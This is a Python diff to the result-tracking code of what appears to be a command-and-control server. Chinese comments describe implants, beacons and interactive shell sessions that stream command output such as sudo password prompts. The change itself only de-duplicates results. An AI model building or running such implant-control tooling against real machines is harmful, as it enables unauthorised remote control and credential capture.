@@ -105,12 +105,29 @@ class ClientManager:
             if rec:
                 rec.last_seen = datetime.now()
 
-    def add_result(self, client_id: str, result: TaskResult) -> None:
-        """记录任务执行结果。"""
+    def add_result(self, client_id: str, result: TaskResult,
+                   overwrite: bool = False) -> bool:
+        """记录任务执行结果。
+
+        v2 批量模型:implant 可能重发未获 ACK 的结果——按 task_id 去重,
+        已存在则跳过。返回 True=新增, False=重复或 beacon 不存在。
+
+        overwrite=True(交互式 shell 会话):同 task_id 结果**覆盖**旧值——
+        shell 命令执行期间每次回连上报当前累积输出(如 sudo 的 password:
+        提示),服务端保留最新一份,前端按 received_at 增量显示。
+        """
         with self._lock:
             rec = self._clients.get(client_id)
-            if rec:
-                rec.results.append(result)
+            if not rec:
+                return False
+            for i, r in enumerate(rec.results):
+                if r.task_id == result.task_id:
+                    if not overwrite:
+                        return False  # 重复上报,跳过
+                    rec.results[i] = result  # 覆盖
+                    return True
+            rec.results.append(result)
+            return True
 
     def remove_client(self, client_id: str) -> None:
         """移除客户端记录。"""
